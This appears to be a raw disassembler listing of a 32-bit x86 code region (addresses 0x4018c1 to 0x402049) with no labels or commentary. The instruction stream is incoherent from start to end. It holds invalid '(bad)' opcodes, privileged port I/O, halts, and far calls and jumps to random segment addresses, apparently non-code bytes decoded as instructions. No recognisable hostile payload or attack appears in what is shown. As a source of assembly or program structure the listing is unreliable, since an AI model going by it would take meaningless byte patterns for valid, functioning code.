  4018c1:	cli    
  4018c2:	pusha  
  4018c3:	jecxz  0x4018f6
  4018c5:	aaa    
  4018c6:	and    DWORD PTR [ebx],edi
  4018c8:	(bad)  
  4018c9:	mov    al,0xd7
  4018cb:	xor    al,0xc9
  4018cd:	clc    
  4018ce:	in     al,dx
  4018cf:	imul   ebx,DWORD PTR [ebx+ebp*1-0x5e],0xffffffef
  4018d4:	push   0x5b
  4018d6:	mov    WORD PTR [eax+edx*4-0x5029d611],fs
  4018dd:	pop    edx
  4018de:	jl     0x4018c2
  4018e0:	je     0x4018d9
  4018e2:	xchg   DWORD PTR [eax],esp
  4018e4:	cmp    DWORD PTR ds:0x2e1a2f54,eax
  4018ea:	lock xor eax,DWORD PTR [eax]
  4018ed:	sti    
  4018ee:	bnd jae 0x40194f
  4018f1:	mov    ds:0xa4beba61,al
  4018f6:	cmp    al,0x63
  4018f8:	pcmpgtd mm0,mm0
  4018fb:	fmul   DWORD PTR [ebp+eax*2+0x589f5c4b]
  401902:	mov    ebp,0x52be0348
  401907:	out    0x39,al
  401909:	inc    esi
  40190a:	loope  0x40189d
  40190c:	pop    ebx
  40190d:	addr16 call 0x49a910dd
  401913:	push   ebp
  401914:	add    bl,al
  401916:	mov    ds:0x81ecfdff,al
  40191b:	hlt    
  40191c:	(bad)  
  40191e:	and    eax,0x687d5c1c
  401923:	leave  
  401924:	jne    0x4018d2
  401926:	es hlt 
  401928:	inc    edx
  401929:	cli    
  40192a:	sub    bl,0x84
  40192d:	(bad)  
  40192e:	push   ds
  40192f:	leave  
  401930:	push   es
  401931:	pusha  
  401932:	add    edx,DWORD PTR [edx]
  401934:	pop    esp
  401935:	push   esi
  401936:	int3   
  401937:	push   0x9a2f9341
  40193c:	mov    edi,0x7ec9b556
  401941:	(bad)  
  401943:	pop    edi
  401944:	js     0x40193d
  401946:	rcr    BYTE PTR [ebp+0x43],1
  401949:	pop    ds
  40194a:	mov    ecx,0xac4bdf87
  40194f:	add    DWORD PTR [ebx-0x4d0fb1c2],esi
  401955:	mov    dl,0xb3
  401957:	pop    ds
  401958:	mov    bl,0x6
  40195a:	rcr    DWORD PTR ds:0x98fcd35d,cl
  401960:	imul   ebx,DWORD PTR [edi+0x50836842],0x60538c4f
  40196a:	ret    
  40196b:	dec    ebp
  40196c:	add    eax,0x9ed0c538
  401971:	xchg   edi,eax
  401972:	mov    ds:0x6dcd4501,eax
  401977:	jp     0x401957
  401979:	pop    eax
  40197a:	mov    esp,0xaaa8bc40
  40197f:	mov    dh,BYTE PTR [ecx+eax*1-0x23]
  401983:	sub    eax,DWORD PTR [ecx]
  401985:	pop    es
  401986:	lds    esi,FWORD PTR [esi]
  401988:	xchg   BYTE PTR [esi+0x5e],bl
  40198b:	cli    
  40198c:	int3   
  40198d:	aas    
  40198e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40198f:	push   cs
  401990:	or     bh,BYTE PTR [edi+edx*1-0x28]
  401994:	jl     0x401988
  401996:	loope  0x40198e
  401998:	jle    0x401963
  40199a:	jmp    0x3b6f3e09
  40199f:	stos   DWORD PTR es:[edi],eax
  4019a0:	inc    edx
  4019a1:	out    0x75,eax
  4019a3:	in     al,dx
  4019a4:	mov    dl,BYTE PTR [edx]
  4019a6:	or     al,0xf5
  4019a8:	in     al,0x94
  4019aa:	std    
  4019ab:	gs out 0x95,eax
  4019ae:	in     eax,dx
  4019af:	scas   al,BYTE PTR es:[edi]
  4019b0:	and    eax,0x24335e9e
  4019b5:	adc    al,0xb6
  4019b7:	and    BYTE PTR [esi-0x45],bh
  4019ba:	or     BYTE PTR [edx],bl
  4019bc:	sub    al,0xc4
  4019be:	ret    0x1758
  4019c1:	fwait
  4019c2:	mov    WORD PTR ds:[edi+0x22],es
  4019c6:	xchg   ebp,eax
  4019c7:	inc    ebx
  4019c8:	mov    eax,ds:0x80b7c68f
  4019cd:	out    dx,eax
  4019ce:	popa   
  4019cf:	dec    ecx
  4019d0:	test   BYTE PTR [edi-0x73],dl
  4019d3:	sbb    cl,dl
  4019d5:	loope  0x4019d0
  4019d7:	fst    DWORD PTR ss:0xc6692bf4
  4019de:	xor    ecx,esi
  4019e0:	adc    eax,0x1c8eb543
  4019e5:	lahf   
  4019e6:	test   BYTE PTR [ebx],cl
  4019e8:	fcom   DWORD PTR [ecx]
  4019ea:	popa   
  4019eb:	gs loop 0x4019c1
  4019ee:	jle    0x401a0b
  4019f0:	pop    esi
  4019f1:	sbb    eax,0x761d5dc7
  4019f6:	jmp    0x401994
  4019f8:	inc    ebp
  4019f9:	xchg   esp,eax
  4019fa:	lahf   
  4019fb:	test   al,0x7c
  4019fd:	sub    al,0xe1
  4019ff:	cwde   
  401a00:	or     dl,bh
  401a02:	cdq    
  401a03:	cmp    eax,0xcfd4a73a
  401a08:	loopne 0x401a58
  401a0a:	pop    ss
  401a0b:	ins    DWORD PTR es:[edi],dx
  401a0c:	mov    eax,ds:0xd99f9e7b
  401a11:	or     al,0x66
  401a13:	dec    ebx
  401a14:	mov    cs,WORD PTR [ebx+0x1062005d]
  401a1a:	adc    ebp,DWORD PTR gs:[ecx-0x2211e383]
  401a21:	repnz test al,0xce
  401a24:	adc    BYTE PTR [esi],bh
  401a26:	sbb    DWORD PTR [esi+eax*4],ebx
  401a29:	inc    ecx
  401a2a:	pop    esi
  401a2b:	jnp    0x4019ae
  401a2d:	leave  
  401a2e:	ret    
  401a2f:	and    DWORD PTR [ebp+edx*1-0x3f0e1c79],ebx
  401a36:	dec    ebp
  401a37:	add    eax,0x411a4e44
  401a3c:	pushf  
  401a3d:	sub    DWORD PTR [edi-0x26],edi
  401a40:	add    al,0xdf
  401a42:	pop    esi
  401a43:	fld    DWORD PTR [ecx+0x31877b90]
  401a49:	mov    BYTE PTR [edx],dh
  401a4b:	cdq    
  401a4c:	out    0x76,eax
  401a4e:	mov    eax,ds:0x865c5724
  401a53:	lar    esi,WORD PTR [eax]
  401a56:	pop    ds
  401a57:	xchg   ecx,eax
  401a58:	test   DWORD PTR [eax+0x1fbd69ec],ebx
  401a5e:	ret    0x57cf
  401a61:	into   
  401a62:	outs   dx,DWORD PTR ds:[esi]
  401a63:	sbb    edi,DWORD PTR [ebx+0xf]
  401a66:	jne    0x401a7c
  401a68:	xchg   edi,eax
  401a69:	lea    edi,[edi-0x581f0a76]
  401a6f:	xor    al,0x3
  401a71:	mov    dh,0x9f
  401a73:	sar    BYTE PTR [eax+0x3b],1
  401a76:	xchg   ecx,eax
  401a77:	mov    ah,0x4
  401a79:	ror    BYTE PTR ds:0xc7bba097,0x81
  401a80:	fsubr  QWORD PTR [ebp-0x5e08cc7e]
  401a86:	movq   QWORD PTR [esi],mm6
  401a89:	jno    0x401ae6
  401a8b:	mov    edx,0x4fbf9859
  401a90:	test   DWORD PTR [esp+ebx*1+0xa],0xdc519298
  401a98:	push   ss
  401a99:	xlat   BYTE PTR ds:[ebx]
  401a9a:	or     BYTE PTR ds:0xed48cc0d,bl
  401aa0:	sbb    eax,0x3eed2745
  401aa5:	mov    al,0xd8
  401aa7:	iret   
  401aa8:	add    DWORD PTR [edx+edx*4+0x6e5a06b2],ecx
  401aaf:	and    ch,0x41
  401ab2:	je     0x401ab3
  401ab4:	or     DWORD PTR [edx],esi
  401ab6:	inc    esi
  401ab7:	test   eax,0x99eb2fac
  401abc:	or     eax,0x81e07ad4
  401ac1:	data16 (bad) 
  401ac3:	int3   
  401ac4:	cmp    al,0xd1
  401ac6:	ja     0x401a9a
  401ac8:	cmc    
  401ac9:	fisttp QWORD PTR [eax+0x31]
  401acc:	mov    eax,0xdf2f5cbe
  401ad1:	add    edx,ebp
  401ad3:	bound  ecx,QWORD PTR [ebp-0x64b7827c]
  401ad9:	mov    edi,0x152df9a0
  401ade:	pop    eax
  401adf:	pop    ss
  401ae0:	jb     0x401b3b
  401ae2:	pop    ebp
  401ae3:	lock jmp 0xd355:0x768efaeb
  401aeb:	(bad)  
  401aec:	adc    BYTE PTR [ebp-0xf],bh
  401aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401af0:	mov    ecx,0x70610590
  401af5:	shr    BYTE PTR [esi],1
  401af7:	adc    esp,ebp
  401af9:	test   BYTE PTR [edx],dl
  401afb:	stc    
  401afc:	leave  
  401afd:	mov    WORD PTR [edi],fs
  401aff:	mov    ?,WORD PTR [ecx]
  401b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b02:	dec    eax
  401b03:	out    0x53,al
  401b05:	xchg   edx,eax
  401b06:	mov    edx,0xac60d546
  401b0b:	loope  0x401b16
  401b0d:	xor    DWORD PTR [ebx-0x2e],ebx
  401b10:	adc    BYTE PTR [ebx+0x0],dl
  401b13:	leave  
  401b14:	fnstenv [edi]
  401b16:	and    al,0xd0
  401b18:	mov    eax,0x4c6a8d06
  401b1d:	sbb    BYTE PTR [edi+0x42aee6bc],cl
  401b23:	sbb    eax,eax
  401b25:	add    ebp,0xd56608d1
  401b2b:	fwait
  401b2c:	dec    ecx
  401b2d:	sbb    dl,BYTE PTR [esi]
  401b2f:	and    DWORD PTR [esi],ebx
  401b31:	xchg   ebp,eax
  401b32:	or     DWORD PTR [esi+0x4754a46c],ebp
  401b38:	popf   
  401b39:	sbb    eax,0x9a2a8edb
  401b3e:	bswap  ebp
  401b40:	push   esi
  401b41:	jp     0x401b4e
  401b43:	dec    edx
  401b44:	inc    edx
  401b45:	push   0xfffffff3
  401b47:	cli    
  401b48:	adc    BYTE PTR [ecx+esi*1+0x6],dl
  401b4c:	fcmovb st,st(3)
  401b4e:	retf   0xca4a
  401b51:	push   ebp
  401b52:	lds    edx,FWORD PTR fs:[ebp-0x60]
  401b56:	xchg   esi,eax
  401b57:	xor    ecx,DWORD PTR [esp+ebx*1-0x70]
  401b5b:	call   0xe3e1:0xd0973ec4
  401b62:	nop
  401b63:	mov    edi,0xac57ab41
  401b68:	push   ecx
  401b69:	adc    ch,BYTE PTR ds:0xb1f9a793
  401b6f:	popf   
  401b70:	scas   eax,DWORD PTR es:[edi]
  401b71:	mov    eax,ds:0x7d8d4740
  401b76:	into   
  401b77:	aas    
  401b78:	call   0x29ca:0xdff417e2
  401b7f:	inc    edx
  401b80:	fstp   TBYTE PTR [edi+eiz*4]
  401b83:	adc    esi,DWORD PTR [ecx+0x1275d86d]
  401b89:	and    ebp,DWORD PTR [ecx+0x4c]
  401b8c:	xor    BYTE PTR [ecx+0x1575a10d],ch
  401b92:	mov    WORD PTR [esi],ss
  401b94:	lods   al,BYTE PTR ds:[esi]
  401b95:	(bad)  
  401b97:	clc    
  401b98:	das    
  401b99:	jb     0x401bbc
  401b9b:	cli    
  401b9c:	cmp    edx,edx
  401b9e:	in     eax,dx
  401b9f:	pop    esp
  401ba0:	sar    DWORD PTR [eax-0x25fdebd9],0x40
  401ba7:	mov    DWORD PTR [edi-0x16],0xd192cda4
  401bae:	jmp    0x401b75
  401bb0:	xlat   BYTE PTR ds:[ebx]
  401bb1:	mov    al,0x4b
  401bb3:	loope  0x401ba9
  401bb5:	ds mov edi,0x571d75f3
  401bbb:	pop    ss
  401bbc:	je     0x401b42
  401bbe:	sbb    cl,bl
  401bc0:	xor    eax,DWORD PTR [esp+ecx*1+0x39661f26]
  401bc7:	push   cs
  401bc8:	push   edx
  401bc9:	das    
  401bca:	mov    esi,0x23b02572
  401bcf:	dec    ecx
  401bd0:	push   ecx
  401bd1:	jnp    0x401bdb
  401bd3:	sub    al,0x19
  401bd5:	stos   BYTE PTR es:[edi],al
  401bd6:	outs   dx,BYTE PTR fs:[esi]
  401bd8:	inc    eax
  401bd9:	arpl   WORD PTR [edi+0xb498c3a],ax
  401bdf:	lods   eax,DWORD PTR ds:[esi]
  401be0:	stos   DWORD PTR es:[edi],eax
  401be1:	sub    eax,0x4ce5641f
  401be6:	mov    ah,BYTE PTR [ebx]
  401be8:	add    DWORD PTR [edi],esi
  401bea:	test   BYTE PTR [esi],ah
  401bec:	jl     0x401b96
  401bee:	fwait
  401bef:	sbb    ch,BYTE PTR [esi]
  401bf1:	xchg   ebx,eax
  401bf2:	nop
  401bf3:	and    esi,DWORD PTR [edi]
  401bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bf6:	rcr    ch,1
  401bf8:	fild   DWORD PTR [ebx-0x52]
  401bfb:	imul   BYTE PTR [eax+0x475b273c]
  401c01:	pop    edi
  401c02:	call   0xc8f3afbe
  401c07:	or     bh,BYTE PTR [ebx+0x22e8cbb1]
  401c0d:	inc    ebx
  401c0e:	ret    
  401c0f:	mov    cl,0x6a
  401c11:	out    0x61,eax
  401c13:	xor    al,0x47
  401c15:	push   ebx
  401c16:	cmp    DWORD PTR [ebp+eiz*4+0x3071e554],0x38
  401c1e:	loope  0x401bcb
  401c20:	leave  
  401c21:	in     eax,0xbf
  401c23:	and    DWORD PTR [ecx+0x6286c2fd],esi
  401c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c2a:	jb     0x401be4
  401c2c:	sub    DWORD PTR [ebp+0x79],0xcd2965d
  401c33:	retf   
  401c34:	add    al,0x31
  401c36:	ins    DWORD PTR es:[edi],dx
  401c37:	adc    al,0x95
  401c39:	nop
  401c3a:	push   es
  401c3b:	imul   ebp,DWORD PTR [edi-0x76],0x939df7fa
  401c42:	adc    DWORD PTR [esi-0x73],ebx
  401c45:	mov    esp,0xb45049b9
  401c4a:	sbb    bl,dl
  401c4c:	fdiv   QWORD PTR [edi]
  401c4e:	gs xor al,0x96
  401c51:	xor    BYTE PTR [eax+0x48dc6aa2],dh
  401c57:	cmp    eax,0xdb0753a4
  401c5c:	sti    
  401c5d:	bound  ecx,QWORD PTR [ebx+0x2c]
  401c60:	ret    0x1a96
  401c63:	(bad)  
  401c64:	pop    edi
  401c65:	pop    ebp
  401c66:	aam    0xbc
  401c68:	push   es
  401c69:	bnd je 0x401c82
  401c6c:	std    
  401c6d:	ins    DWORD PTR es:[edi],dx
  401c6e:	inc    eax
  401c6f:	fild   DWORD PTR [edx]
  401c71:	psubq  mm0,QWORD PTR [eax-0x264c4e5d]
  401c78:	into   
  401c79:	sahf   
  401c7a:	inc    ecx
  401c7b:	inc    eax
  401c7c:	or     eax,0x65741f51
  401c81:	mov    edi,0xd2e34106
  401c86:	rcr    BYTE PTR [edi],cl
  401c88:	outs   dx,BYTE PTR ds:[esi]
  401c89:	iret   
  401c8a:	mov    ebp,DWORD PTR [esi-0x41015934]
  401c90:	loopne 0x401ccb
  401c92:	sub    al,0xfe
  401c94:	data16 mov bl,0x5a
  401c97:	add    al,0xd0
  401c99:	pusha  
  401c9a:	sbb    bl,cl
  401c9c:	cmp    eax,0x498f45b9
  401ca1:	jg     0x401c96
  401ca3:	lods   eax,DWORD PTR ds:[esi]
  401ca4:	and    al,0x1f
  401ca6:	stos   BYTE PTR es:[edi],al
  401ca7:	mov    eax,ebx
  401ca9:	xchg   edx,eax
  401caa:	shl    BYTE PTR [edx+0x5d],1
  401cad:	sti    
  401cae:	mov    dl,0xa3
  401cb0:	das    
  401cb1:	sbb    ecx,DWORD PTR [ecx-0x432f5bde]
  401cb7:	leave  
  401cb8:	xchg   esp,eax
  401cb9:	dec    eax
  401cba:	mov    bl,0xe6
  401cbc:	mov    al,ds:0xad2d30
  401cc1:	call   0xc67:0xd8d0c134
  401cc8:	adc    DWORD PTR [esi+0x7f],edi
  401ccb:	out    dx,eax
  401ccc:	adc    DWORD PTR [ebx+0x1],edi
  401ccf:	push   ebx
  401cd0:	sub    al,0x2d
  401cd2:	fdivp  st(7),st
  401cd4:	outs   dx,DWORD PTR ds:[esi]
  401cd5:	cmc    
  401cd6:	cmc    
  401cd7:	or     eax,0xa546ad19
  401cdc:	mov    WORD PTR [ecx+0x3d],?
  401cdf:	nop
  401ce0:	std    
  401ce1:	push   ss
  401ce2:	in     al,0x39
  401ce4:	jle    0x401ca2
  401ce6:	cmp    BYTE PTR [edx+0x5d],bl
  401ce9:	jne    0x401ce8
  401ceb:	fsubr  QWORD PTR [ebx-0x33632f43]
  401cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cf2:	setge  BYTE PTR [edx+ecx*8+0x2c]
  401cf7:	adc    BYTE PTR ds:0xb3dd6739,bl
  401cfd:	ss cld 
  401cff:	jmp    0x401d66
  401d01:	sub    BYTE PTR [ebx-0x3e],dl
  401d04:	mov    ecx,0x42498ca9
  401d09:	fcomp  QWORD PTR [edx+edi*2]
  401d0c:	repnz push ebp
  401d0e:	lods   al,BYTE PTR ds:[esi]
  401d0f:	outs   dx,BYTE PTR ds:[esi]
  401d10:	inc    DWORD PTR [eax+0x302bc05a]
  401d16:	jae    0x401cd7
  401d18:	xchg   edi,eax
  401d19:	inc    ecx
  401d1a:	stos   DWORD PTR es:[edi],eax
  401d1b:	xchg   esi,eax
  401d1c:	mov    al,0x92
  401d1e:	sahf   
  401d1f:	dec    edi
  401d20:	adc    edx,ebx
  401d22:	ins    BYTE PTR es:[edi],dx
  401d23:	dec    esi
  401d24:	loop   0x401d26
  401d26:	retf   
  401d27:	lea    esp,[ecx+0x55]
  401d2a:	cwde   
  401d2b:	jp     0x401d59
  401d2d:	dec    ebp
  401d2e:	jno    0x401cc0
  401d30:	xchg   esi,eax
  401d31:	dec    cl
  401d33:	inc    edi
  401d34:	pop    eax
  401d35:	clc    
  401d36:	sub    BYTE PTR [ecx+0x31],0xe9
  401d3a:	cmc    
  401d3b:	mov    eax,ds:0x2a15feec
  401d40:	sub    eax,0x99925abe
  401d45:	inc    esi
  401d46:	xor    DWORD PTR [esi+0x58],esi
  401d49:	test   DWORD PTR [eax+0x11ad047c],ecx
  401d4f:	popf   
  401d50:	and    al,0xe4
  401d52:	repz test BYTE PTR [ecx],al
  401d55:	dec    edx
  401d56:	cmp    BYTE PTR [eax+0x6f],0x23
  401d5a:	arpl   WORD PTR [ebp-0x33],ax
  401d5d:	call   0x45c417ea
  401d62:	mov    ds:0x6a0970bd,eax
  401d67:	scas   eax,DWORD PTR es:[edi]
  401d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d69:	pop    es
  401d6a:	jnp    0x401da1
  401d6c:	dec    esi
  401d6d:	retf   0x2bc8
  401d70:	pop    edx
  401d71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d72:	scas   al,BYTE PTR es:[edi]
  401d73:	jbe    0x401d88
  401d75:	test   DWORD PTR [esi-0x195fd183],ecx
  401d7b:	sub    BYTE PTR [edx+0x6c],0xd4
  401d7f:	or     dl,bl
  401d81:	cld    
  401d82:	repnz ins BYTE PTR es:[edi],dx
  401d84:	push   ecx
  401d85:	pop    eax
  401d86:	xchg   esp,eax
  401d87:	adc    BYTE PTR fs:[ebx+0x73],al
  401d8b:	pop    ss
  401d8c:	jmp    0x5bdc18c6
  401d91:	imul   DWORD PTR [esi-0x2b]
  401d94:	push   ebx
  401d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d96:	test   eax,0xcf92c27b
  401d9b:	pop    ebp
  401d9c:	pop    esp
  401d9d:	add    ch,cl
  401d9f:	ja     0x401d67
  401da1:	or     DWORD PTR [eax+0x3a53f0be],ebx
  401da7:	fiadd  WORD PTR [esi]
  401da9:	xchg   esp,eax
  401daa:	mov    al,0xec
  401dac:	push   esi
  401dad:	hlt    
  401dae:	xchg   DWORD PTR [ebx],esp
  401db0:	stos   DWORD PTR es:[edi],eax
  401db1:	test   DWORD PTR [edx],esp
  401db3:	cmp    edi,esp
  401db5:	jno    0x401d82
  401db7:	xor    DWORD PTR [edx],ebp
  401db9:	repz ds (bad) 
  401dbc:	xchg   edx,eax
  401dbd:	dec    esi
  401dbe:	dec    eax
  401dbf:	dec    edi
  401dc0:	sub    dh,BYTE PTR [eax-0x2f60583]
  401dc6:	and    al,0xe2
  401dc8:	mov    ch,0x13
  401dca:	jo     0x401d9b
  401dcc:	adc    eax,0x493a0f9b
  401dd1:	mov    dh,0xc
  401dd3:	cdq    
  401dd4:	push   0xce5f6467
  401dd9:	xchg   esp,eax
  401dda:	lds    ebx,FWORD PTR [edx]
  401ddc:	push   ebx
  401ddd:	imul   esp,DWORD PTR ds:0x439d1dc7,0xffffffeb
  401de4:	test   BYTE PTR [ebp+0x37],bh
  401de7:	ret    0x63a5
  401dea:	xchg   ebx,eax
  401deb:	out    dx,al
  401dec:	xlat   BYTE PTR ds:[ebx]
  401ded:	repnz dec eax
  401def:	pop    ss
  401df0:	push   ecx
  401df1:	xchg   ebx,eax
  401df2:	sbb    BYTE PTR [edx-0x35],cl
  401df5:	dec    eax
  401df6:	sub    edx,DWORD PTR [edx+esi*1-0x101d7e83]
  401dfd:	add    esp,ebx
  401dff:	fadd   QWORD PTR [ebx+0x5c3ac58f]
  401e05:	bound  edx,QWORD PTR cs:[ecx+0x50990c1e]
  401e0c:	int    0xe5
  401e0e:	cmc    
  401e0f:	add    BYTE PTR [ecx+ebx*4-0x1efdd99e],cl
  401e16:	or     eax,0x85597fd
  401e1b:	vhsubps ymm7,ymm7,ymm2
  401e1f:	scas   al,BYTE PTR es:[edi]
  401e20:	mov    cl,0xba
  401e22:	mov    eax,ds:0x76ce7a35
  401e27:	and    DWORD PTR [esp+esi*2+0xb],ebx
  401e2b:	adc    DWORD PTR [ebp+ecx*8-0x40afae51],esp
  401e32:	cmp    al,0x50
  401e34:	cmp    DWORD PTR [ebx+0x70],edi
  401e37:	and    dh,BYTE PTR [ebx-0x4b]
  401e3a:	ins    BYTE PTR es:[edi],dx
  401e3b:	retf   0xec7
  401e3e:	es stos DWORD PTR es:[edi],eax
  401e40:	xchg   DWORD PTR [esi+eiz*1+0x59ebdca5],eax
  401e47:	cmp    al,0xff
  401e49:	cmp    al,0x63
  401e4b:	and    ebp,DWORD PTR [eax+0x47]
  401e4e:	cmp    eax,0xe061f09b
  401e53:	ret    0xce3
  401e56:	fsubr  DWORD PTR [esi-0x2c1075a]
  401e5c:	push   ebp
  401e5d:	in     eax,0xc6
  401e5f:	cdq    
  401e60:	dec    edi
  401e61:	sub    ah,0x1b
  401e64:	dec    edx
  401e65:	int    0x4b
  401e67:	add    eax,0xb0994672
  401e6c:	test   eax,0x1a75b39f
  401e71:	mov    esp,0xf1dffc8d
  401e76:	pop    ebx
  401e77:	les    ebx,FWORD PTR [esi-0x53a33cf2]
  401e7d:	inc    esp
  401e7e:	xor    ebx,eax
  401e80:	lock imul ecx,DWORD PTR [edi+0x5b],0x3ed1df64
  401e88:	lahf   
  401e89:	ins    BYTE PTR es:[edi],dx
  401e8a:	push   edi
  401e8b:	aaa    
  401e8c:	jnp    0x401e90
  401e8e:	push   edi
  401e8f:	cmp    DWORD PTR [eax+ebx*4+0x6b],edi
  401e93:	sbb    BYTE PTR [ecx+0x4f9fa30],0x6
  401e9a:	jmp    0x401e2f
  401e9c:	push   ebx
  401e9d:	jge    0x401f14
  401e9f:	adc    ebp,ecx
  401ea1:	aam    0x9d
  401ea3:	add    BYTE PTR [edx-0x63],bh
  401ea6:	in     al,dx
  401ea7:	stos   DWORD PTR es:[edi],eax
  401ea8:	dec    edx
  401ea9:	add    ebx,DWORD PTR [ebx+eiz*8-0x1c]
  401ead:	push   cs
  401eae:	push   ds
  401eaf:	mov    eax,0x31143dd5
  401eb4:	mov    dh,bh
  401eb6:	repz fistp DWORD PTR [ebx+0x5e]
  401eba:	push   ds
  401ebb:	push   0xe3dde085
  401ec0:	call   0x41f3:0xa305ac60
  401ec7:	xchg   edi,edi
  401ec9:	test   al,0x21
  401ecb:	ret    
  401ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ecd:	sub    dl,BYTE PTR [edx]
  401ecf:	sub    edi,DWORD PTR [ebp-0x1b]
  401ed2:	pop    ds
  401ed3:	ficom  DWORD PTR [ebx+0x18df67d8]
  401ed9:	or     eax,0xf0da76d4
  401ede:	pushf  
  401edf:	pop    eax
  401ee0:	outs   dx,BYTE PTR ds:[esi]
  401ee1:	fist   WORD PTR [ebx+0xd59446d]
  401ee7:	xor    BYTE PTR [edx-0x63],ch
  401eea:	dec    eax
  401eeb:	mov    al,ds:0xb0237b36
  401ef0:	es mov dh,0x0
  401ef3:	sbb    bh,bh
  401ef5:	les    ebp,FWORD PTR [ecx]
  401ef7:	in     eax,0x54
  401ef9:	outs   dx,DWORD PTR ds:[esi]
  401efa:	cdq    
  401efb:	lods   eax,DWORD PTR ds:[esi]
  401efc:	and    BYTE PTR [ebx+0x438054b],0x92
  401f03:	nop
  401f04:	mov    al,gs:0x515e1086
  401f0a:	data16 out dx,al
  401f0c:	sub    BYTE PTR [esi-0x59eff28c],dh
  401f12:	mov    ah,0xe3
  401f14:	cld    
  401f15:	mov    esp,cs
  401f17:	in     eax,dx
  401f18:	and    edx,ebx
  401f1a:	mov    bl,0x1b
  401f1c:	or     DWORD PTR [edi],esp
  401f1e:	mov    bh,0xbb
  401f20:	mov    bl,0xf8
  401f22:	add    al,BYTE PTR ds:[eax-0x2c]
  401f26:	sbb    al,0x7c
  401f28:	jmp    0x401eda
  401f2a:	cld    
  401f2b:	adc    dl,BYTE PTR [ebp-0xa]
  401f2e:	test   eax,0xe0e3f469
  401f33:	sahf   
  401f34:	pop    esi
  401f35:	adc    dl,BYTE PTR [ecx+0x5beb91c6]
  401f3b:	xchg   esi,eax
  401f3c:	fidivr DWORD PTR [esi+edx*4+0x1440d1a4]
  401f43:	sub    ebp,DWORD PTR [ebx]
  401f45:	(bad)  
  401f46:	mov    BYTE PTR [esi-0x49],ah
  401f49:	push   ebp
  401f4a:	sbb    esi,DWORD PTR [esi]
  401f4c:	jmp    0x55c3:0x6ee8169e
  401f53:	push   edi
  401f54:	cwde   
  401f55:	lds    eax,FWORD PTR [edi]
  401f57:	pop    esp
  401f58:	xchg   ecx,eax
  401f59:	scas   eax,DWORD PTR es:[edi]
  401f5a:	add    bl,BYTE PTR [edi+0x6395e13e]
  401f60:	loopne 0x401f87
  401f62:	shl    DWORD PTR [edx-0x141f660b],1
  401f68:	icebp  
  401f69:	jl     0x401f2c
  401f6b:	out    dx,eax
  401f6c:	sbb    DWORD PTR [esi+0x7a484a39],ebx
  401f72:	pop    esp
  401f73:	nop
  401f74:	int3   
  401f75:	dec    ecx
  401f76:	push   esp
  401f77:	les    ebp,FWORD PTR [ecx]
  401f79:	icebp  
  401f7a:	and    ebx,ecx
  401f7c:	jmp    0x401f34
  401f7e:	test   BYTE PTR [ebx+0x53],0x76
  401f82:	mov    ds:0xd336a98,eax
  401f87:	mov    edi,0xf158b55f
  401f8c:	xchg   edi,eax
  401f8d:	mov    bh,0x76
  401f8f:	cmp    esp,0xfaf260d7
  401f95:	xchg   ebp,eax
  401f96:	and    BYTE PTR [edx],cl
  401f98:	mov    DWORD PTR [edx],ebp
  401f9a:	xchg   edi,eax
  401f9b:	(bad)  
  401f9c:	dec    esp
  401f9d:	ret    0x7fc1
  401fa0:	les    ebp,FWORD PTR [eax+0x31efc3bc]
  401fa6:	jno    0x401fa0
  401fa8:	hlt    
  401fa9:	fld    TBYTE PTR [edx+0x4c]
  401fac:	test   al,0x63
  401fae:	push   ebx
  401faf:	jecxz  0x401fa0
  401fb1:	popf   
  401fb2:	jp     0x402011
  401fb4:	(bad)  
  401fb5:	or     edx,DWORD PTR [esi+0x6900840a]
  401fbb:	in     al,0x4
  401fbd:	popf   
  401fbe:	push   cs
  401fbf:	ficomp WORD PTR [eax]
  401fc1:	clc    
  401fc2:	sub    al,0x9
  401fc4:	sbb    al,0xfe
  401fc6:	fmul   QWORD PTR [ecx+0xa]
  401fc9:	js     0x402040
  401fcb:	push   0x56095fd
  401fd0:	mov    edi,0xbc4d0dc
  401fd5:	mov    BYTE PTR [edx+0x2d2d514],bl
  401fdb:	shl    BYTE PTR [ebp-0x1e783edc],cl
  401fe1:	sbb    DWORD PTR [ebp-0x59afacf2],esi
  401fe7:	jp     0x40202f
  401fe9:	das    
  401fea:	nop
  401feb:	cmp    dl,BYTE PTR [esi+0x78]
  401fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fef:	or     al,0x6d
  401ff1:	popf   
  401ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ff3:	xchg   esp,eax
  401ff4:	jb     0x401fc9
  401ff6:	add    al,0x5f
  401ff8:	pop    es
  401ff9:	in     al,dx
  401ffa:	xor    ah,dl
  401ffc:	add    ah,BYTE PTR [ecx+0x77c7666f]
  402002:	xchg   edx,ecx
  402004:	retf   
  402005:	adc    eax,DWORD PTR ds:0xa887f5c3
  40200b:	outs   dx,BYTE PTR ds:[esi]
  40200c:	call   0x784f:0x638c739c
  402013:	iret   
  402014:	xchg   ebp,eax
  402015:	test   esi,eax
  402017:	stos   DWORD PTR es:[edi],eax
  402018:	inc    ebp
  402019:	sbb    eax,DWORD PTR [eax-0x35cdd8ad]
  40201f:	inc    edi
  402020:	xchg   edi,eax
  402021:	and    ch,BYTE PTR [ebx]
  402023:	test   eax,0xe353159d
  402028:	pop    edx
  402029:	lods   al,BYTE PTR ds:[esi]
  40202a:	xor    al,0xc7
  40202c:	sar    DWORD PTR [edx-0x23],1
  40202f:	push   edx
  402030:	mov    DWORD PTR [edi+0x75],esp
  402033:	jge    0x40208e
  402035:	sbb    DWORD PTR [edx+0x5de7367a],ebx
  40203b:	adc    bl,BYTE PTR [ecx+0x25]
  40203e:	stos   DWORD PTR es:[edi],eax
  40203f:	aad    0x75
  402041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402042:	sbb    ah,BYTE PTR [ebx]
  402044:	and    BYTE PTR [ebx+ecx*1],ah
  402047:	rcr    esi,1
  402049:	mov    esi,edi
